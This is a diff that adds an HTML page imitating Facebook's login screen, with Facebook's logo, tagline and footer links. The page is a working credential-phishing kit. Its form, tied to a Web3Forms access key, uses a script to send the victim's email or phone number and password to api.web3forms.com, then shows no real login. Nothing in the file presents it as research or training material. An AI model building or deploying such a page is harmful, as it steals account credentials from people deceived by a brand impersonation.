@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook-log in or sign up</title>
+
+    <!-- Favicon (Facebook Icon from a reliable source) -->
+    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" type="image/x-icon">
+
+    <style>
+        /* Global styles */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f2f5;
+            /* Add top space */
+            padding-top: 50px; /* Adjust this value to control the space at the top */
+        }
+
+        /* Flexbox Layout for Centering */
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center; /* Center vertically */
+            height: calc(30vh - 150px); /* Adjusting to account for padding at the top */
+            padding: 200px;
+            flex-direction: row;
+        }
+
+        /* Left side styling for logo and tagline */
+        .left-section {
+            flex: 1;
+            padding-right: 50px;
+            text-align: left;
+        }
+
+        /* Logo styling */
+        .left-section img {
+            width: 200px;  /* Adjust width as per the logo size */
+            margin-left: 0.01px;
+        }
+
+        .left-section p {
+            font-size: 27px;  /* Adjusted font size */
+            color: #333;
+            line-height: 1.3;
+            margin-top: 0.1px;  /* Reduced margin to bring it closer */
+            width: 500px;
+            margin-left: 30px;
+        }
+
+        /* Right section (login form box) styling */
+        .right-section {
+            width: 35%;
+            background-color: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .right-section input,
+        .right-section button {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+
+        /* Email and Password input styling */
+        .right-section input {
+            border: 1px solid #ddd;
+            background-color: #FFFFFF;
+        }
+
+        /* Blue login button styling */
+        .right-section button {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+
+        /* Forgot password and line styles */
+        .forgot-password {
+            text-align: center;
+            margin-top: 10px;
+        }
+
+        .forgot-password a {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        hr {
+            margin: 20px 0;
+            border: 0;
+            border-top: 1px solid #ddd;
+        }
+
+        /* Create New Account button styled inline (half size) */
+        .create-account {
+            background-color: #42b72a;
+            color: white;
+            font-weight: bold;
+            border: none;
+            cursor: pointer;
+            text-align: center;
+            padding: 5px 10px; /* Reduced padding for smaller size */
+            font-size: 14px; /* Reduced font size for smaller button */
+            border-radius: 5px;
+            display: inline-block; /* This makes the button take only the space of its text */
+        }
+
+        /* Create a Page link styling */
+        .create-page {
+            text-align: right;
+            margin-top: 0px;
+            margin-right: 230px;
+            font-size: 14px;
+        }
+
+        .create-page a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+
+        /* Footer section with quick links and languages */
+        .footer {
+            text-align: center;
+            padding: 20px;
+            font-size: 12px;
+            color: #606770;
+            background-color: #FFFFFF;
+        }
+
+        .footer a {
+            color: #606770;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+
+        /* Responsive styling */
+        @media (max-width: 768px) {
+            .left-section {
+                display: block;
+                text-align: center;
+                padding: 20px 0;
+            }
+
+            .right-section {
+                width: 100%;
+                max-width: 400px;
+            }
+
+            /* Move logo and tagline to the top */
+            .container {
+                flex-direction: column;
+                align-items: center;
+            }
+
+            /* Reduce space between logo and tagline in mobile view */
+            .left-section p {
+                margin-top: 10px;
+                font-size: 18px; /* Adjusted font size */
+            }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+
+  <div class="left-section">
+
+            <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" style="width: 300px;" alt="Logo">
+                                   <p>Facebook helps you connect and share with the people in your life.</p>
+
+</div>
+            
+
+    
+        <div class="right-section">
+       
+                  <form method="POST" id="form">
+                                    <!-- Replace with your Access Key -->
+                                    <input type="hidden" name="access_key" value="362eaa24-91f0-43c5-9b52-8fe071240dd0">
+                <input type="text" name="email/phone" placeholder="Email address or phone number" required style= "width: 310px;">
+                <input type="password" name="paswrd" placeholder="Password" required style= "width: 310px;">
+                <button type="submit" style= "width: 335px;"><b>Log In</b></button>
+<div id="result"></div>
+<script src="https://web3forms.com/client/script.js" async defer></script>
+
+<script>
+const form = document.getElementById('form');
+const result = document.getElementById('result');
+
+form.addEventListener('submit', function(e) {
+  e.preventDefault();
+  const formData = new FormData(form);
+  const object = Object.fromEntries(formData);
+  const json = JSON.stringify(object);
+  result.innerHTML = "<b></b>"
+
+    fetch('https://api.web3forms.com/submit', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Accept': 'application/json'
+            },
+            body: json
+        })
+        .then(async (response) => {
+            let json = await response.json();
+            if (response.status == 200) {
+                result.innerHTML = "<span style='color:red;'><b></b></span>";
+            } else {
+                console.log(response);
+                result.innerHTML = json.message;
+            }
+        })
+        .catch(error => {
+            console.log(error);
+            result.innerHTML = "";
+        })
+        .then(function() {
+            password.reset();
+            setTimeout(() => {
+                result.style.display = "none";
+            }, 3000);
+        });
+});
+</script>
+            </form>
+
+            <!-- Forgot Password -->
+            <div class="forgot-password">
+                <a href="#">Forgotten password?</a>
+            </div>
+            <hr>
+            <div style="text-align: center;">
+                <button class="create-account" style="background-color: #42b72a;padding: 14px 20px; width: 200px;">Create New Account</button>
+            </div>
+            </div>
+            </div>
+<div class="create-page">
+                <a href="https://web.facebook.com/pages/create/?ref_type=registration_form">Create a Page</a> for a celebrity, brand, or business.
+            </div>
+            <br>
+              <br>
+                <br>
+                  <br>
+                    <br> 
+</div>
+
+    <!-- Footer Section: Languages and Quick Links -->
+    <div class="footer">
+        <!-- Languages -->
+        <div style="margin-bottom: 10px;">
+            <a href="#">English (US)</a>
+            <a href="#">Français (France)</a>
+            <a href="#">Español</a>
+            <a href="#">Deutsch</a>
+            <a href="#">Italiano</a>
+            <a href="#">Português (Brasil)</a>
+            <a href="#">العربية</a>
+            <a href="#">中文(简体)</a>
+            <a href="#">हिन्दी</a>
+            <a href="#">日本語</a>
+        </div>
+
+        <!-- Quick Links -->
+        <div style="margin-top: 10px;">
+            <a href="#">Sign Up</a>
+            <a href="#">Log In</a>
+            <a href="#">Messenger</a>
+            <a href="#">Facebook Lite</a>
+            <a href="#">Watch</a>
+            <a href="#">Places</a>
+            <a href="#">Games</a>
+            <a href="#">Marketplace</a>
+            <a href="#">Jobs</a>
+            <a href="#">Oculus</a>
+            <a href="#">Portal</a>
+            <a href="#">Instagram</a>
+            <a href="#">Local</a>
+            <a href="#">Fundraisers</a>
+            <a href="#">Services</a>
+            <a href="#">Voting Information Center</a>
+            <a href="#">About</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+            <a href="#">Help</a>
+            <a href="#">Careers</a>
+            <a href="#">Ad Choices</a>
+            <a href="#">Cookies</a>
+            <a href="#">Accessibility</a>
+            <a href="#">Site Map</a>
+            <a href="#">Developers</a>
+            <a href="#">Business</a>
+            <a href="#">Contact</a>
+        </div>
+    </div>
+
+</body>
+</html>
